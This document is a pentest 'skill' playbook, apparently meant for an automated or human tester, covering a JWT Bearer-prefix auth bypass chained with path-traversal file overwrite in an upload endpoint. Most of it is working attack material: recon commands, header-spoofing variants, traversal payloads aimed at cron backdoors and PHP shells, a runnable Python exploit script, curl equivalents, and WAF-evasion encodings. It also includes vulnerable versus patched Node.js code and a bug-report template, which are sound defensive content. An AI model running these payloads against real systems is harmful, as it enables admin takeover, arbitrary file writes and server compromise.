# Skill: Auth Bypass via Bearer Header Stripping + Arbitrary File Overwrite via Path Traversal

## 0. When to Use This Skill
Use this skill when **all** of the following are true:
- Target is a web application with a separate frontend (React, Vue, Angular, Next.js) serving an admin panel.
- Authentication uses `Authorization: Bearer <JWT>` headers for API communication.
- An upload or resource management endpoint exists (e.g., `/api/upload-resource`, `/upload`, `/api/files`).
- You suspect client-side-only access control or loose server-side Bearer token format validation.

**Skip this skill if:** The server enforces strict JWT signature validation and path canonicalization on every request, or the application uses session cookies exclusively (not Bearer tokens) for admin auth.

---

## 1. Meta-Data
- **Category:** Broken Access Control / Business Logic / File Upload
- **Target Component:** Client-Side Rendered Admin Panels (React/Vue/Angular) + REST API Upload Endpoints
- **Complexity:** Medium — requires proxy interception, JS endpoint discovery, and path traversal testing
- **Estimated CVSS:** 8.1 (High) for auth bypass + arbitrary read/write (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N); escalates to **9.1 (Critical)** if RCE is achievable via file overwrite
- **CWE:** CWE-287 (Improper Authentication), CWE-22 (Path Traversal), CWE-434 (Unrestricted File Upload)
- **OWASP:** A01:2021 — Broken Access Control
- **Reference:** OWASP Testing Guide v4.2 — OTG-AUTHN-001, OTG-AUTHZ-002, OTG-BUSLOGIC-009

---

## 2. Prerequisites (Trigger Conditions)
- [ ] Application uses a separate SPA frontend (React/Vue/Angular) for the admin interface with public rendering.
- [ ] Authentication is handled via `Authorization: Bearer <JWT>` headers — not session cookies.
- [ ] An upload endpoint exists (e.g., `/upload`, `/api/upload-resource`) accessible from the admin UI.
- [ ] The upload endpoint accepts a user-controlled parameter that defines the destination path (e.g., `fullFilePath`, `filename`, `path`, `parent`, `dest`).
- [ ] Server-side validation of the Bearer scheme prefix is absent or incomplete.
- [ ] File path validation does not canonicalize or jail paths before writing to disk.

---

## 3. Reconnaissance & Detection

### 3.1 Identify the Admin Interface

```bash
# Subdomain enumeration targeting admin panels
subfinder -d target.com -silent | grep -iE "admin|manage|dashboard|control|panel|staff|internal"
amass enum -passive -d target.com | grep -iE "admin|cms|mgmt|backoffice"

# Path brute-force on the main domain
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403 \
     -fc 404 -t 50

# Specific admin path patterns
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ \
     -mc 200,301 \
     -t 30 \
     -fl 0 \
     -fs 0
```

### 3.2 Extract API Endpoints from JavaScript Bundles

```bash
# Download and parse all JS bundles from the admin panel
# Look for /api/ routes, upload endpoints, and auth headers

# Step 1: Extract all JS file URLs from the page
curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js' | sort -u

# Step 2: Fetch each bundle and search for endpoint patterns
for js_url in $(curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js'); do
    curl -s "https://admin.target.com${js_url}" | \
    grep -oP '(["'"'"'])(\/api\/[a-zA-Z0-9\/\-_?=&]+)\1' | \
    sort -u
done

# Step 3: Search for upload-specific keywords
for js_url in $(curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js'); do
    curl -s "https://admin.target.com${js_url}" | \
    grep -iE "upload|file|resource|fullFilePath|filename|multipart" | \
    head -20
done

# Alternative: Use relative-url extractor tools
python3 -c "
import re, sys
content = sys.stdin.read()
patterns = [
    r'[\"\'](/api/[a-zA-Z0-9/_\-?=&.]+)[\"\'`]',
    r'[\"\'](/upload[a-zA-Z0-9/_\-?=&.]*)[\"\'`]',
    r'[\"\'](/v[0-9]/[a-zA-Z0-9/_\-?=&.]+)[\"\'`]',
]
for p in patterns:
    for m in re.findall(p, content):
        print(m)
" < bundle.js | sort -u
```

### 3.3 Test Bearer Header Stripping Bypass

Set up Burp Suite with the admin panel proxied, then test the following header mutations on any admin-only API endpoint:

```
# Original (authenticated)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Variant 1: Strip "Bearer " prefix — send raw token only
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Variant 2: Remove header entirely
(no Authorization header)

# Variant 3: Empty Bearer
Authorization: Bearer

# Variant 4: Null/whitespace token
Authorization: Bearer null

# Variant 5: Alternative internal-IP spoofing (if auth fails)
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

### 3.4 Check Upload Endpoint for Path Traversal

```bash
# Probe for path parameters using common names
# Intercept a legitimate upload and look for these parameters:
# - fullFilePath, filePath, path, filename, dest, destination, parent, folder, dir

# Baseline: upload to legitimate path
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2Ftest.txt&provider=provider_storage_local_file_system

# Path traversal probe: attempt to write outside the resource root
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2F%2e%2e%2Ftest.txt&provider=provider_storage_local_file_system
#                                                                          ^^^^^ URL-encoded ../

# Deep traversal: target web root or config files
POST /api/upload-resource?...&fullFilePath=resource%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd
```

### 3.5 Historical Endpoint Discovery

```bash
# Check Wayback Machine for old API endpoint patterns
waybackurls target.com | grep -iE "upload|file|resource|api" | sort -u

# gau (Get All URLs)
gau admin.target.com | grep -iE "upload|file|resource|api"
```

### 3.6 Vulnerability Decision Table

| Observed Behavior | Verdict |
|---|---|
| Admin panel returns `200 OK` with raw token (no "Bearer " prefix) | **VULNERABLE — Auth Bypass Confirmed** |
| Admin panel returns `200 OK` with no `Authorization` header | **VULNERABLE — No Auth Enforced Server-Side** |
| Admin panel returns `401` for all header variants except valid `Bearer <token>` | Not vulnerable to header stripping |
| Upload endpoint writes file to traversed path (`../../target_file.html`) with no error | **VULNERABLE — Path Traversal Confirmed** |
| Upload endpoint returns `400` or `403` for any `../` in path parameter | Likely filtered — test encoding variants (§6) |
| Upload endpoint sanitizes path but writes to predictable location | Partial — pivot to overwriting accessible web assets |

---

## 4. Exploitation Chain (Step-by-Step)

### Step 1 — Authentication Bypass via Bearer Header Stripping

The backend middleware validates the presence of a JWT but fails to enforce the `Bearer ` scheme prefix. Sending the raw token without the prefix bypasses the format check while still providing a parseable JWT.

```
# BEFORE (legitimate request — blocked by auth if no valid token)
GET /api/admin/dashboard HTTP/1.1
Host: admin.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE

# AFTER (bypass — raw token, no "Bearer " prefix)
GET /api/admin/dashboard HTTP/1.1
Host: admin.target.com
Authorization: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE

# Expected vulnerable response: 200 OK with admin dashboard data
# (instead of 401 Unauthorized)
```

### Step 2 — File Upload Interception

Navigate the now-accessible admin dashboard to find file/resource upload functionality. Upload a benign file and intercept the POST request via Burp Suite.

```http
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2Flegitimate.html&provider=provider_storage_local_file_system HTTP/1.1
Host: admin.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Authorization: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

<html><p>test</p></html>
------WebKitFormBoundaryABC123--
```

### Step 3 — Path Traversal Injection

Modify the `fullFilePath` parameter to escape the intended upload directory using URL-encoded traversal sequences.

```
# Original (safe path):
fullFilePath=resource%2Flegitimate.html
# Decoded: resource/legitimate.html → writes to /app/uploads/resource/legitimate.html

# Traversal payload (target web root):
fullFilePath=resource%2F%2e%2e%2F%2e%2e%2Fweb%2Fbuild%2Findex.html
# Decoded: resource/../../web/build/index.html → writes to /app/web/build/index.html

# Traversal payload (target server config):
fullFilePath=resource%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fcron.d%2Fbackdoor
# Decoded: resource/../../../etc/cron.d/backdoor
```

### Step 4 — Arbitrary File Overwrite

```http
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2F%2e%2e%2F%2e%2e%2Fweb%2Fbuild%2Ftarget_file.html&provider=provider_storage_local_file_system HTTP/1.1
Host: admin.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXX
Authorization: [JWT_WITHOUT_BEARER_PREFIX]

------WebKitFormBoundaryXXXXXX
Content-Disposition: form-data; name="file"; filename="proof.html"
Content-Type: text/html

<html><body><h1>File Overwrite PoC — Vulnerable</h1></body></html>
------WebKitFormBoundaryXXXXXX--
```

Verify exploitation:
```bash
curl -s https://admin.target.com/build/target_file.html | grep "Vulnerable"
```

### Step 5 — Optional RCE via Overwriting Executable Assets

If the server executes certain file types (PHP, JSP, etc.) or serves JS files loaded by the admin panel:

```
# Overwrite a server-side script (PHP target)
fullFilePath=resource%2F%2e%2e%2F%2e%2e%2Fpublic%2Fshell.php

# Overwrite a dynamically loaded JS file (client-side persistence/XSS)
fullFilePath=resource%2F%2e%2e%2F%2e%2e%2Fassets%2Fapp.chunk.js

# Overwrite cron job (Linux persistence)
fullFilePath=resource%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fcron.d%2Fbackdoor
```

---

## 5. PoC — Executable Python Script

```python
#!/usr/bin/env python3
"""
PoC: Authentication Bypass via Bearer Header Stripping
      + Arbitrary File Overwrite via Path Traversal

Usage:
    python3 poc.py --target https://admin.target.com --token <JWT>

IMPORTANT: Use only on systems you own or have written authorization to test.
"""

import argparse
import sys
import requests
import urllib.parse
from requests_toolbelt.multipart.encoder import MultipartEncoder

requests.packages.urllib3.disable_warnings()

# ─────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────
UPLOAD_PATH    = "/api/upload-resource"
TEST_ENDPOINT  = "/api/admin/dashboard"   # Any admin-only endpoint to confirm bypass
PROBE_CONTENT  = b"<html><body><h1>PoC: Path Traversal Write</h1></body></html>"
TRAVERSAL_PATHS = [
    "resource/../../web/build/poc_test.html",
    "resource/../../public/poc_test.html",
    "resource/../../../var/www/html/poc_test.html",
]


def check_auth_bypass(base_url: str, token: str, session: requests.Session) -> bool:
    """
    Test Step 1: Send the raw JWT without the 'Bearer ' prefix.
    Returns True if the server responds with 200 (bypass confirmed).
    """
    url = base_url.rstrip("/") + TEST_ENDPOINT
    print(f"\n[*] Testing Bearer header stripping on: {url}")

    # Baseline — no auth header (expect 401)
    r_noauth = session.get(url, headers={}, verify=False, timeout=10)
    print(f"    No auth header      → HTTP {r_noauth.status_code}")

    # Legitimate Bearer format (expect 200 if token is valid)
    r_bearer = session.get(url, headers={"Authorization": f"Bearer {token}"},
                           verify=False, timeout=10)
    print(f"    Bearer <token>      → HTTP {r_bearer.status_code}")

    # Bypass: raw token without 'Bearer ' prefix
    r_bypass = session.get(url, headers={"Authorization": token},
                           verify=False, timeout=10)
    print(f"    <token> (no Bearer) → HTTP {r_bypass.status_code}")

    if r_bypass.status_code == 200 and r_noauth.status_code in (401, 403):
        print("    [VULNERABLE] Auth bypass confirmed — server accepts token without 'Bearer ' prefix")
        return True
    else:
        print("    [NOT VULNERABLE] Server correctly rejects stripped header")
        return False


def test_path_traversal(base_url: str, token: str, session: requests.Session) -> list:
    """
    Test Step 2+3: Attempt to write a file outside the upload root
    using path traversal sequences in the fullFilePath parameter.
    Returns list of successful traversal paths.
    """
    url = base_url.rstrip("/") + UPLOAD_PATH
    successful = []

    print(f"\n[*] Testing path traversal on upload endpoint: {url}")

    for raw_path in TRAVERSAL_PATHS:
        encoded_path = urllib.parse.quote(raw_path, safe="")
        full_url = (
            f"{url}?owner=built-in&user=admin"
            f"&fullFilePath={encoded_path}"
            f"&provider=provider_storage_local_file_system"
        )

        mp = MultipartEncoder(fields={
            "file": ("poc.html", PROBE_CONTENT, "text/html")
        })

        headers = {
            "Authorization": token,           # Use stripped token (bypass)
            "Content-Type": mp.content_type,
        }

        print(f"\n    Trying: {raw_path}")
        print(f"    Encoded: {encoded_path}")

        try:
            r = session.post(full_url, data=mp, headers=headers,
                             verify=False, timeout=15)
            print(f"    Response: HTTP {r.status_code}")

            if r.status_code in (200, 201):
                print(f"    [VULNERABLE] Server accepted traversal write → {raw_path}")
                successful.append(raw_path)
            elif r.status_code == 400:
                resp_text = r.text[:200]
                if "invalid" in resp_text.lower() or "path" in resp_text.lower():
                    print(f"    [FILTERED] Server rejected path: {resp_text}")
                else:
                    print(f"    [UNKNOWN 400] Response: {resp_text}")
            elif r.status_code in (401, 403):
                print(f"    [AUTH FAILED] Auth bypass may not apply to upload endpoint")
            else:
                print(f"    Response body: {r.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(f"    [ERROR] Request failed: {e}")

    return successful


def verify_write(base_url: str, session: requests.Session,
                 traversal_path: str) -> bool:
    """
    Verify that the file was actually written by fetching it via HTTP.
    Assumes the traversal target is web-accessible.
    """
    # Extract the relative web path from the traversal payload
    # e.g., resource/../../web/build/poc_test.html → /web/build/poc_test.html
    parts = traversal_path.split("/")
    # Strip leading "resource" + traverse up for each ".."
    depth = parts.count("..")
    web_parts = parts[depth + 1:]   # parts after all ".." sequences
    web_path = "/" + "/".join(web_parts)

    verify_url = base_url.rstrip("/") + web_path
    print(f"\n[*] Verifying file write at: {verify_url}")

    try:
        r = session.get(verify_url, verify=False, timeout=10)
        if r.status_code == 200 and b"PoC" in r.content:
            print(f"    [CONFIRMED] File is web-accessible and contains PoC content!")
            print(f"    Impact: Arbitrary file overwrite at {web_path}")
            return True
        else:
            print(f"    HTTP {r.status_code} — file may exist but not web-accessible, "
                  "or path mapping differs")
    except requests.exceptions.RequestException as e:
        print(f"    [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC: Auth Bypass via Bearer Header Stripping + Path Traversal File Overwrite"
    )
    parser.add_argument("--target", required=True,
                        help="Base URL of the admin panel (e.g. https://admin.target.com)")
    parser.add_argument("--token", required=True,
                        help="Valid JWT token (without 'Bearer ' prefix)")
    parser.add_argument("--upload-path", default=UPLOAD_PATH,
                        help=f"Upload API path (default: {UPLOAD_PATH})")
    parser.add_argument("--custom-traversal",
                        help="Custom traversal path to test (e.g. 'resource/../../etc/passwd')")
    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Research PoC)"})

    print("=" * 60)
    print("  Auth Bypass + File Overwrite PoC")
    print(f"  Target: {args.target}")
    print("=" * 60)

    # --- Phase 1: Auth Bypass ---
    bypassed = check_auth_bypass(args.target, args.token, session)
    if not bypassed:
        print("\n[!] Auth bypass failed. Continuing to test upload endpoint "
              "with legitimate Bearer token anyway...")

    # --- Phase 2: Path Traversal ---
    paths = list(TRAVERSAL_PATHS)
    if args.custom_traversal:
        paths.insert(0, args.custom_traversal)

    successful = test_path_traversal(args.target, args.token, session)

    # --- Phase 3: Verification ---
    if successful:
        print(f"\n[+] {len(successful)} traversal path(s) succeeded. Verifying...")
        for path in successful:
            verify_write(args.target, session, path)
    else:
        print("\n[-] No successful path traversal writes detected.")
        print("    → Try encoding variants (see Evasion section in SKILL.md)")

    # --- Summary ---
    print("\n" + "=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print(f"  Auth bypass (header stripping): {'YES' if bypassed else 'NO'}")
    print(f"  Path traversal writes:          {len(successful)} path(s)")
    if bypassed or successful:
        print("  [!] VULNERABILITY CONFIRMED — Report immediately")
    else:
        print("  No vulnerabilities confirmed with default payloads.")
        print("  Test encoding variants and custom paths manually.")


if __name__ == "__main__":
    main()
```

**Run the PoC:**
```bash
# Install dependencies
pip install requests requests-toolbelt

# Basic usage
python3 poc.py --target https://admin.target.com --token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIG

# With custom traversal path
python3 poc.py \
  --target https://admin.target.com \
  --token <JWT> \
  --custom-traversal "resource/../../web/build/target_file.html"
```

**Manual curl equivalent:**
```bash
JWT="eyJhbGciOiJIUzI1NiJ9..."

# Step 1: Test auth bypass
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: ${JWT}" \
  https://admin.target.com/api/admin/dashboard

# Step 2: Path traversal file write
TRAVERSAL_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('resource/../../web/build/poc.html', safe=''))")
curl -s -w "\nHTTP %{http_code}\n" \
  -X POST \
  -H "Authorization: ${JWT}" \
  -F "file=@./poc.html;type=text/html" \
  "https://admin.target.com/api/upload-resource?owner=built-in&user=admin&fullFilePath=${TRAVERSAL_PATH}&provider=provider_storage_local_file_system"

# Step 3: Verify the write
curl -s https://admin.target.com/build/poc.html
```

---

## 6. Code Evidence — Vulnerable vs Patched

### Vulnerable — Bearer Scheme Not Enforced (Node.js/Express)
```javascript
// VULNERABLE: Accepts any non-empty Authorization header value as the token
app.use((req, res, next) => {
    const authHeader = req.headers['authorization'];
    if (!authHeader) return res.status(401).json({ error: 'No token' });

    // BUG: extracts token regardless of "Bearer " prefix presence
    const token = authHeader.startsWith('Bearer ')
        ? authHeader.slice(7)
        : authHeader;  // ← Falls through with raw token — bypass succeeds

    try {
        req.user = jwt.verify(token, SECRET);
        next();
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }
});
```

### Patched — Strict Bearer Scheme Enforcement
```javascript
// SAFE: Rejects any Authorization header that doesn't start with "Bearer "
app.use((req, res, next) => {
    const authHeader = req.headers['authorization'];
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Missing or invalid Authorization scheme' });
    }

    const token = authHeader.slice(7); // Exactly 7 chars: "Bearer "
    if (!token) return res.status(401).json({ error: 'Empty token' });

    try {
        req.user = jwt.verify(token, SECRET);
        next();
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }
});
```

### Vulnerable — Path Not Sanitized Before File Write (Node.js)
```javascript
// VULNERABLE: User-controlled path flows directly to fs.writeFile
app.post('/api/upload-resource', upload.single('file'), async (req, res) => {
    const uploadRoot = '/app/uploads';
    const filePath   = req.query.fullFilePath; // ← Fully attacker-controlled

    // BUG: No path canonicalization — traversal sequences pass through
    const destination = path.join(uploadRoot, filePath);

    await fs.writeFile(destination, req.file.buffer);
    res.json({ status: 'ok', path: destination });
});
```

### Patched — Path Jailed to Upload Root
```javascript
// SAFE: Resolves and validates path before writing
const path = require('path');
const fs   = require('fs').promises;

app.post('/api/upload-resource', upload.single('file'), async (req, res) => {
    const uploadRoot = path.resolve('/app/uploads');
    const rawPath    = req.query.fullFilePath;

    if (!rawPath) return res.status(400).json({ error: 'Missing fullFilePath' });

    // Canonicalize: resolve removes all ../ sequences
    const destination = path.resolve(uploadRoot, rawPath);

    // JAIL CHECK: destination must start with uploadRoot
    if (!destination.startsWith(uploadRoot + path.sep)) {
        return res.status(400).json({ error: 'Invalid file path' });
    }

    // Allowlist extension check
    const ALLOWED_EXTENSIONS = ['.html', '.css', '.js', '.png', '.jpg', '.svg'];
    if (!ALLOWED_EXTENSIONS.includes(path.extname(destination).toLowerCase())) {
        return res.status(400).json({ error: 'File type not permitted' });
    }

    await fs.writeFile(destination, req.file.buffer);
    res.json({ status: 'ok' });
});
```

---

## 7. Evasion Techniques (Bypass / Edge Cases)

### 7.1 Path Traversal Encoding Variants

If standard `../` is filtered, try these encoding alternatives:

| Payload | Encoding Type | Use When |
|---|---|---|
| `%2e%2e%2f` | URL-encoded | Standard WAF bypass |
| `%252e%252e%252f` | Double URL-encoded | Server decodes twice |
| `..%2f` | Mixed encoding | Partial filter bypass |
| `%2e%2e/` | Encoded dots, literal slash | Slash-only filter |
| `..\` | Windows separator | IIS / Windows hosts |
| `..%5c` | URL-encoded backslash | Windows + encoded |
| `....//` | Overlong sequence | Naive `../` string filter |
| `..;/` | Tomcat-specific | Apache Tomcat routing |

```bash
# Automate encoding variants with ffuf
ffuf -w /usr/share/seclists/Fuzzing/path-traversal-unix.txt \
     -u "https://admin.target.com/api/upload-resource?fullFilePath=resource/FUZZ/target.html" \
     -X POST \
     -H "Authorization: ${JWT}" \
     -F "file=@test.html" \
     -mc 200,201
```

### 7.2 Null Byte Injection (Legacy Environments)

On servers using C/C++ file handling libraries or legacy PHP, a null byte terminates the filename string:
```
fullFilePath=resource%2F%2e%2e%2Fpoc.php%00.html
# Server writes:  poc.php  (null byte truncates .html extension)
# Allows execution of PHP if server runs PHP
```

### 7.3 Alternative Auth Headers (If Bearer Stripping Fails)

If the Bearer prefix stripping does not bypass auth, the server may have another trust boundary:
```
# Spoof internal/localhost identity
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Claim admin role via custom headers (if app trusts them)
X-User-Role: admin
X-Admin: true
X-Internal: 1
```

### 7.4 Multi-Step Traversal (Chained Path Components)

If the server validates `../` sequences before the path is fully constructed, chaining traversal across multiple parameters may bypass it:
```
# Split traversal across two parameters
fullFilePath=resource%2F..&extra=..%2Ftarget.html

# Or inject into the `owner` / `provider` fields
owner=built-in%2F..%2F..&fullFilePath=web%2Fbuild%2Ftarget.html
```

---

## 8. Report Template

### Title
`[High/Critical] Authentication Bypass via Bearer Header Stripping Enables Arbitrary File Overwrite via Path Traversal in Upload Endpoint`

### Summary
The admin panel at `admin.target.com` performs authentication through a middleware that accepts raw JWT tokens in the `Authorization` header without enforcing the `Bearer ` scheme prefix. An attacker who obtains any valid JWT (e.g., their own low-privilege token, a leaked token, or a token harvested via another vulnerability) can strip the `Bearer ` prefix and gain access to admin-only functionality.

Once inside the admin panel, the `/api/upload-resource` endpoint accepts a user-controlled `fullFilePath` query parameter that is passed directly to the file system without path canonicalization. By injecting `../` sequences, an attacker can write arbitrary content to any file the web server process has write access to, including web root assets, server-side scripts, and configuration files.

### Impact
- **Authentication Bypass:** Any valid JWT (regardless of privilege level) grants administrative access. Eliminates the security boundary between normal users and administrators.
- **Arbitrary File Write:** Content can be written to any path reachable by the server process — web root, configuration files, cron jobs.
- **Potential RCE:** Overwriting an executable file (PHP script, Node.js module, cron job) with a malicious payload enables remote code execution and full server compromise.
- **Persistent Backdoor:** Overwriting a static asset (JS bundle, HTML page) allows injecting malicious code served to all users of the application (stored XSS with system-wide impact).

### Severity
**High** — CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) for auth bypass + file overwrite.

Escalates to **Critical** — CVSS 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) if RCE is demonstrated.

### Steps to Reproduce
1. Log in as any user (low-privilege account) and capture the JWT from the `Authorization` header.
2. Send a GET request to `https://admin.target.com/api/admin/dashboard` with `Authorization: <JWT>` (no "Bearer " prefix). Observe `200 OK` response — authentication bypass confirmed.
3. Navigate to the admin file upload section. Upload a benign file and intercept the POST request to `/api/upload-resource`.
4. Modify the `fullFilePath` parameter to `resource%2F%2e%2e%2F%2e%2e%2Fweb%2Fbuild%2Fpoc.html` (decoded: `resource/../../web/build/poc.html`).
5. Set the file body to `<html><body>Vulnerable</body></html>`.
6. Send the request. Observe `200 OK` — file write accepted outside upload root.
7. Access `https://admin.target.com/build/poc.html` and confirm the file content is served.

### Recommended Fix

**Authentication Middleware:**
- Strictly validate that the `Authorization` header begins with exactly `Bearer ` (with trailing space). Reject any request where the scheme is absent or different with `401 Unauthorized`.

**Upload Endpoint:**
- Canonicalize the `fullFilePath` value using `path.resolve()` (or equivalent) before constructing the file system destination.
- Enforce a path jail: verify that the resolved absolute path starts with the designated upload root directory.
- Apply an extension allowlist and reject files with executable or sensitive extensions (`.php`, `.jsp`, `.js`, `.sh`, `.py`, `.env`, `.conf`).
- Store uploaded files in a directory that is not directly web-accessible; serve them through a controlled route that sets appropriate `Content-Type` and `Content-Disposition` headers.

---

## 9. References
- [OWASP — Path Traversal (CWE-22)](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP — Broken Access Control (A01:2021)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Testing Guide v4.2 — Testing for Path Traversal (OTG-AUTHZ-001)](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger — File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [PayloadsAllTheThings — Path Traversal Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)
- [HackTricks — File Upload Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [RFC 6750 — The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750)
